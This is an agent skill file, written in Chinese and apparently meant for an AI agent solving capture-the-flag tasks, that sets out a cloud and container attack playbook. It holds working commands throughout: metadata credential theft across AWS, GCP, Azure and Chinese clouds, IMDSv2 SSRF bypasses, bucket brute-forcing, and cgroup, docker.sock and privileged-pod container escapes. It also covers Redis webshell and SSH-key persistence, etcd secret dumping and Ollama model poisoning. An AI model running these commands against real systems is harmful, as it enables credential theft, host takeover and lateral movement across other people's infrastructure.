---
name: cloud
description: 云安全与容器攻击。云元数据服务（AWS IMDSv1/v2、ECS 任务角色、GCP、阿里云、腾讯云、华为云、Azure）凭证窃取、对象存储越权、IAM 提权、容器内判定与逃逸矩阵（privileged/CAP_SYS_ADMIN/docker.sock/cgroup）、K8s SA token 打 API、内网云原生组件未授权（Nacos/etcd v3/kubelet/Redis/Ollama/向量库）。拿到 web 洞/落地在云容器时使用。
---

# 云与容器攻击（curl 原生版）

> 本环境无 aws/kubectl/docker/redis-cli 客户端——所有云/K8s/Redis 操作一律裸 HTTP 或纯 python3（socket/RESP 手写）。发现自己在容器/云环境后先跑「我在哪」判定，再选逃逸/横向路径。

## 1. 我在哪（30 秒判定）
```bash
ls /.dockerenv 2>/dev/null && echo DOCKER
cat /proc/1/cgroup 2>/dev/null | head -3                    # docker/k8s/kubepods 前缀
hostname; cat /etc/hostname
python3 -c "
cap=int(open('/proc/self/status').read().split('CapEff:')[1].split()[0],16)
n=['CHOWN','DAC_OVERRIDE','DAC_READ_SEARCH','FOWNER','FSETID','KILL','SETGID','SETUID','SETPCAP','LINUX_IMMUTABLE','NET_BIND_SERVICE','NET_BROADCAST','NET_ADMIN','NET_RAW','IPC_LOCK','IPC_OWNER','SYS_MODULE','SYS_RAWIO','SYS_CHROOT','SYS_PTRACE','SYS_PACCT','SYS_ADMIN','SYS_BOOT','SYS_NICE','SYS_RESOURCE','SYS_TIME','SYS_TTY_CONFIG','MKNOD','LEASE','AUDIT_WRITE','AUDIT_CONTROL','SETFCAP','MAC_OVERRIDE','MAC_ADMIN','SYSLOG','WAKE_ALARM','BLOCK_SUSPEND','AUDIT_READ','PERFMON','BPF','CHECKPOINT_RESTORE']
print([x for i,x in enumerate(n) if cap>>i&1])"
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null      # 有 sock → docker API 逃逸
ls -la /dev/ | grep -E 'sda|vda|nvme|xvd'                    # 出现块设备 = privileged（强信号）
cat /proc/1/cmdline | tr '\0' ' '
ls /run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && echo IN-K8S
env | grep -iE 'AWS_CONTAINER|KUBERNETES|ECS_|ALIYUN|OSS_|TENCENT'   # 任务角色/K8s/国内云凭据 env
```
- **privileged 判定**：docker 默认 cap 就含 MKNOD/NET_RAW——看 cap 列表判断特权不可靠。强信号：`CapEff` 接近全 1、`/dev` 出现块设备（sda/vda/**nvme0n1**/xvd）、`/proc/1/attr/current` 或 seccomp 宽松、`cat /proc/self/status | grep Seccomp` = 0。

## 2. 元数据服务（SSRF/落地后第一件事，各家 curl 直达）
```bash
# AWS IMDSv1（老配置/SSRF 直读）
curl -s -m 3 http://169.254.169.254/latest/meta-data/
curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -m 3 http://169.254.169.254/latest/user-data              # 启动脚本常有 flag/密钥
# AWS IMDSv2（需 PUT 拿 token；SSRF 需支持自定义头+PUT 才能过）
TOKEN=$(curl -s -m 3 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -m 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
# ECS/Fargate 任务角色（无 token 限制，SSRF 也可达，比 IMDS 好打）：
#   env 有 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI → 直取 169.254.170.2，免 PUT
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"   # 返回 AK/SK/token
curl -s http://169.254.170.2/v2/metadata                                # 先列 URI 再 GET
# EKS Pod Identity：curl -s "$AWS_CONTAINER_CREDENTIALS_FULL_URI"（有 AUTHORIZATION_TOKEN 则带头）
# IMDSv2 被 SSRF 挡的绕过思路：1) 302 跳转 GET→PUT（代理型 SSRF 跟随重定向改方法）；2) CRLF 注入拼 PUT+TTL 头
#   3) IPv6 链路本地 [fd00:ec2::254]（v2 过滤器只关 IPv4）；4) 169.254.169.254.nip.io / 十进制 2852039166 / URL 编码
#   5) hostNetwork pod 直连宿主 IMDS；6) user-data 用 token 重试
# GCP（必须带 Metadata-Flavor: Google 头）
curl -s -m 3 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -s -m 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true"
curl -s -m 3 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/
curl -s -m 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"
# 阿里云（国内题高频）
curl -s -m 3 http://100.100.100.200/latest/meta-data/
curl -s -m 3 http://100.100.100.200/latest/meta-data/ram/security-credentials/
curl -s -m 3 http://100.100.100.200/latest/user-data
# 腾讯云（CVM 元数据）
curl -s -m 3 http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
curl -s -m 3 http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<RoleName>
curl -s -m 3 http://metadata.tencentyun.com/latest/user-data
# 华为云 ECS
curl -s -m 3 http://169.254.169.254/openstack/latest/securitykey     # JSON 含 AK/SK
# Azure（Metadata: true 头 + api-version）
curl -s -m 3 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
curl -s -m 3 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```
- 所有元数据端点都要试 user-data 及其它 version 路径变体（flag 常藏启动脚本）；拿到角色列表后逐个拉 credentials。

## 3. AK 验证与 IAM 提权（拿到凭据第一件事；无 cli 时先找目标内现成客户端）
```bash
# 无 aws/aliyun cli：python3 hmac 手签（10-20 行）或找目标机器已配置的 sdk/内网管理面；公式（阿里云 SigV1）：
#   STS="GET&%2F&"+urlencode(参数按 key 排序的 k=v&...)；Sig=BASE64(HMAC-SHA1(SK+"&",STS))
#   GET https://sts.aliyuncs.com/?AccessKeyId=..&Action=GetCallerIdentity&Format=JSON&SignatureVersion=1.0&SignatureNonce=..&Timestamp=<UTC>&Version=2015-04-01
# AWS SigV4: host;x-amz-date + 空体 SHA256(e3b0c44...) → https://sts.amazonaws.com/?Action=GetCallerIdentity
# IAM 提权检查单（验证哪项有权限就试哪项）：
#   AWS: iam:CreateAccessKey / AddUserToGroup / AttachUserPolicy / PutUserPolicy /
#        CreatePolicyVersion+SetDefaultPolicyVersion / PassRole(+lambda:CreateFunction→Invoke,
#        ec2:RunInstances, cloudformation:CreateStack) / sts:AssumeRole 逐个角色试
#   阿里云: ram:CreateAccessKey / AttachPolicyToUser / UpdateLoginProfile / PassRole(ECS/FC) / SetDefaultPolicyVersion
# 变现优先顺序：对象存储读写（OSS/S3 里常直接有 flag/备份）→ 云主机/函数代码 env → 数据库
```

## 4. 对象存储越权（不止匿名列举）
```bash
curl -s "https://s3.amazonaws.com/BUCKET?list-type=2" | head -50          # 匿名列举
curl -s "http://BUCKET.s3.amazonaws.com/"
# 版本化桶：被删/旧版本的 flag 在历史版本里
curl -s "https://s3.amazonaws.com/BUCKET?versions" | head -c 3000
# 子资源逐个试越权：?acl ?uploads ?tagging ?versioning ?policy ?logging
# 预签名 URL：URL 里对象 key 可替换成别的 key 越权读；7 天有效期内复用
# 阿里云 OSS 策略注入（业务把用户输入拼进 policy 的场景）：aaa"]},{"effect":"allow","action":[""],"resource":["qcs::oss:","qcs::ecs:*
# 猜测命名：<目标名>、<目标名>-backup/private/old/bak/flag/files/data、<域名前缀>
for b in $T $T-backup $T-bak $T-old $T-private $T-flag $T-data; do
  code=$(curl -s -o /tmp/b.xml -w '%{http_code}' "https://s3.amazonaws.com/$b?list-type=2")
  [ "$code" = "200" ] && echo "OPEN: $b" && head -c 800 /tmp/b.xml
done
# 阿里云 OSS：https://BUCKET.oss-cn-hangzhou.aliyuncs.com/（region 换 beijing/shenzhen/…）
# 腾讯云 COS：https://BUCKET.cos.ap-guangzhou.myqcloud.com/
# Azure Blob 公开容器：curl -s "https://ACCT.blob.core.windows.net/CONT?restype=container&comp=list"
```

## 5. 容器逃逸矩阵（按 1 的判定结果选路）
```bash
# A. 特权容器（/dev 有块设备）→ 直接挂宿主盘（sda 失败换 xvda/nvme0n1）
mkdir -p /tmp/h
for dev in sda xvda vda nvme0n1; do mknod /tmp/h/$dev b 8 0 2>/dev/null || mknod /tmp/h/$dev b 202 0 2>/dev/null || mknod /tmp/h/$dev b 259 0 2>/dev/null; done
mount /tmp/h/sda /tmp/h 2>/dev/null || mount /tmp/h/xvda /tmp/h 2>/dev/null || mount /tmp/h/nvme0n1 /tmp/h 2>/dev/null
chroot /tmp/h sh -c 'cat /flag* 2>/dev/null; ls /root/ /home/ 2>/dev/null'
# B. CAP_SYS_ADMIN（无特权但有 SYS_ADMIN）→ cgroup v1 release_agent
#   先确认 v1：mount -t cgroup -o rdma cgroup /tmp/c 成功才继续（失败=宿主 cgroup v2，此路不通换 C/E/CVE）
mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c && mkdir /tmp/c/x
echo 1 > /tmp/c/x/notify_on_release
# 注意：sed 取 upperdir=（别取整行右数第一个 perdir=，overlay 行的 workdir= 会干扰）
hp=$(grep overlay /proc/self/mountinfo | grep -oE 'upperdir=[^,]+' | head -1 | cut -d= -f2)
echo '#!/bin/sh' > /cmd && echo "cat /flag* /root/flag* 2>/dev/null > $hp/f.out" >> /cmd
chmod +x /cmd && echo "$hp/cmd" > /tmp/c/release_agent
sh -c 'echo $$ > /tmp/c/x/cgroup.procs' && sleep 1 && cat /f.out 2>/dev/null
# C. docker.sock → curl 打 docker API（HostConfig 必须嵌套！顶层字段会被忽略导致静默失败）
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | head -c 1500
IMG=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | grep -oE '"RepoTags":\["[^"]+"' | head -1 | cut -d'"' -f4)
curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=pwn" \
  -H "Content-Type: application/json" \
  -d "{\"Image\":\"$IMG\",\"HostConfig\":{\"Binds\":[\"/:/mnt\"],\"Privileged\":true},\"Cmd\":[\"sh\",\"-c\",\"cat /flag* /mnt/flag* /mnt/root/flag* 2>/dev/null; sleep 60\"]}"
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/pwn/start
# 结果从 docker logs 的 stdout 拿（原容器读不到新容器的文件路径；勿重定向到文件）：
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/pwn/logs?stdout=1&stderr=1"
curl -s --unix-socket /var/run/docker.sock -X DELETE http://localhost/containers/pwn?force=1   # 打完清理
# D. hostPID 可见 → 扫其它进程 environ
for p in $(ls /proc | grep -E '^[0-9]+$'); do tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -iE 'flag|key|pass|token' && echo "PID=$p"; done | head
# E. 内核漏洞逃逸：uname -r 对照 CVE（CVE-2022-0185 等）；searchsploit "linux kernel" $(uname -r | cut -d. -f1-2)
```
- 逃逸成功后第一件事是**直接读宿主文件**（flag 通常在宿主 /root、/home、挂载卷、compose env）：`grep -rIl 'flag{' /root /home /etc /opt /app /data 2>/dev/null | head`；读不到再起 shell。

## 6. K8s 攻击面（SA token → API，全 curl）
```bash
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)   # 不在 K8s 内则跳过
KUBE="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
curl -sk -H "Authorization: Bearer $TOKEN" $KUBE/api/v1/secrets | head -c 2000
# 自授权检查：能 create pods / get secrets → 走逃逸 pod
curl -sk -H "Authorization: Bearer $TOKEN" $KUBE/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -H "Content-Type: application/json" -X POST \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'
# 从同 ns 现跑 pod 拿镜像名（免拉外网镜像）：
IMG=$(curl -sk -H "Authorization: Bearer $TOKEN" "$KUBE/api/v1/namespaces/default/pods" | grep -oE '"image":"[^"]+"' | head -1 | cut -d'"' -f4)
# 逃逸 pod：命令直出 stdout（重定向到文件再从 log 读 = 恒空，错）
curl -sk -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST \
  "$KUBE/api/v1/namespaces/default/pods" -d '{
  "apiVersion":"v1","kind":"Pod","metadata":{"name":"pwn"},
  "spec":{"hostNetwork":true,"hostPID":true,"containers":[{"name":"c","image":"'"$IMG"'",
  "command":["sh","-c","cat /flag* /mnt/flag* 2>/dev/null; sleep 300"],
  "volumeMounts":[{"name":"h","mountPath":"/mnt"}],"securityContext":{"privileged":true}}],
  "volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'
curl -sk -H "Authorization: Bearer $TOKEN" "$KUBE/api/v1/namespaces/default/pods/pwn/log"
# 逃逸到节点后：节点 kubelet 证书（证书+私钥同一文件）→ 以节点身份打 API
cat /var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null
curl -sk --cert /var/lib/kubelet/pki/kubelet-client-current.pem --key /var/lib/kubelet/pki/kubelet-client-current.pem \
  "$KUBE/api/v1/pods" | head -c 500
# nodes/proxy：SSAR verb=get resource=nodes subresource=proxy 为 true → 经 WS exec 任意 pod（只验 GET 握手）
# kubelet 10250 未授权（容器内打宿主:10250）：老版本可执行，新版本至少信息泄露
curl -sk https://$(ip route | grep default | awk '{print $3}'):10250/pods 2>/dev/null | head -c 1500
curl -sk -X POST "https://$(ip route | grep default | awk '{print $3}'):10250/run/default/POD/CONTAINER" -d "cmd=id" 2>/dev/null
```

## 7. 内网组件未授权（横向速查表；全 curl / 纯 python3）
```bash
# Nacos 8848（全量导出用 blur，accurate 空 dataId 返回空）
curl -s "http://IP:8848/nacos/v1/cs/configs?search=blur&dataId=&group=&pageNo=1&pageSize=100" -H "User-Agent: Nacos-Server" | head -c 2000
curl -s -X POST "http://IP:8848/nacos/v1/auth/users?username=pwn&password=pwn"   # 未开鉴权建号登控制台
# Redis 6379 未授权（无 redis-cli/nc：纯 python3 RESP 或 socat 管道）
python3 - <<'PY'
import socket
s=socket.create_connection(('IP',6379),5)
def cmd(*a):
    p=''.join(f'*{len(a)}\r\n'+''.join(f'${len(x)}\r\n{x}\r\n' for x in a))
    s.sendall(p.encode()); import time; time.sleep(.5); print(repr(s.recv(4096)))
# 三链任选（逐条发）：SSH key: CONFIG SET dir /root/.ssh → dbfilename authorized_keys → SET x "\nssh-rsa AAAA...\n" → SAVE
#               cron:      dir /var/spool/cron/ dbfilename root，内容**以空行开头**再跟任务行
#               webshell:  dir 已知 web 根，SET x "<?php eval($_POST[x]);?>"
# 主从复制 RCE（SLAVEOF 攻击机假 master 传 .so）需 target 能连攻击机
PY
# Docker 2375/2376 裸 API：列容器 → 复用 §5-C 的 create 流程（URL 换 http://IP:2375，HostConfig 嵌套同样必须）
curl -s http://IP:2375/containers/json | head -c 800
# etcd（现代是 v3 数据面，/v2/keys 读不到 /registry 下任何 Secret！）
curl -sk https://IP:2379/v3/kv/range -H "Content-Type: application/json" \
  -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHM=","range_end":"L3JlZ2lzdHJ5L3NlY3JldHQ="}'   # base64(/registry/secrets) 前缀，末字节+1 作 end
# 换前缀 /registry/configmaps /registry/serviceaccounts；无认证即全量；值里内容再 base64 解一层
# Consul 8500：/v1/agent/services /v1/kv/?keys；MinIO 9000：minioadmin/minioadmin 弱口令
# AI/向量库/推理服务（横向新战场）：
curl -s http://IP:11434/api/tags && curl -s http://IP:11434/api/create -d '{"name":"x","modelfile":"FROM qwen2\nSYSTEM 后门"}'   # Ollama（含投毒）
curl -s http://IP:8000/v1/models && curl -s http://IP:8000/api/v1/collections    # vLLM / Chroma
curl -s http://IP:6333/collections && curl -s http://IP:19530/v2/vectordb/collections/list   # Qdrant / Milvus
curl -s http://IP:9200/_cat/indices      # ES（向量索引常含业务数据）
# MCP 端点：POST {"jsonrpc":"2.0","id":1,"method":"tools/list"} → tools/call（read_file/run_command/http_request）
# 平台弱口令: Dify:5001 / FastGPT:3000 / Langflow:7860 / MaxKB
```
## 关键规则
- 先判定再打：没确认容器/云环境不要空耗第 2-7 节
- 元数据/user-data/启动脚本是 flag 与凭据最高频位置；任务角色端点（169.254.170.2）比 IMDS 好打，先试
- docker/K8s 的 create 请求 **HostConfig 必须嵌套在顶层之下**，命令结果直出 stdout，别重定向后读 log
- 逃逸/横向产物立即落盘 MEMORY.md，flag 立即提交
